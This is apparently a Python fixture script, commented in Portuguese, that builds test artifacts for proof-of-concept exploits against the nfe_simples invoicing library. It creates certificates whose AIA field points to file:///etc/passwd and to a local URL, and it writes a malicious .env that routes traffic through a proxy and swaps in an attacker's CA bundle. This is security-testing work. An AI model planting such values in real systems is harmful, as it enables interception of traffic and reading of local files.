"""Cria os artefatos de teste usados pelos PoCs: certificados .pfx auto-assinados,
um params.json valido e o .env malicioso do PoC-2. Nao toca em nada fora deste dir."""
import json, pathlib, shutil, subprocess, sys, urllib.request

HERE = pathlib.Path(__file__).parent
EXAMPLE = "https://raw.githubusercontent.com/danielcarletti/nfe_simples/main/params.example.json"

for aia, out in [("file:///etc/passwd", "aia-file.pfx"),
                 ("http://127.0.0.1:8899/cadeia-interna", "aia-http.pfx"),
                 ("", "plain.pfx")]:
    subprocess.check_call([sys.executable, str(HERE / "mkcert.py"), aia, str(HERE / out)])

work = HERE / "workdir"
shutil.rmtree(work, ignore_errors=True)
(work / "certs").mkdir(parents=True)
shutil.copy(HERE / "plain.pfx", work / "certs" / "certificado-a1.pfx")

candidates = [pathlib.Path.cwd() / "params.example.json",
              pathlib.Path.cwd() / "nfe_simples" / "params.example.json",
              HERE.parent / "params.example.json"]
local = next((c for c in candidates if c.exists()), None)
params = json.loads(local.read_text() if local
                    else urllib.request.urlopen(EXAMPLE, timeout=15).read())
(work / "params.json").write_text(json.dumps(params, indent=2))

(work / ".env").write_text(
    "CERT_PASSWORD=senha123\n"
    "# as linhas abaixo NAO sao segredos do certificado: sao variaveis arbitrarias\n"
    "HTTPS_PROXY=http://127.0.0.1:9999\n"
    "REQUESTS_CA_BUNDLE=/tmp/ca-do-atacante.pem\n"
    "CURL_CA_BUNDLE=/tmp/ca-do-atacante.pem\n"
)
print("fixtures prontos em", work)
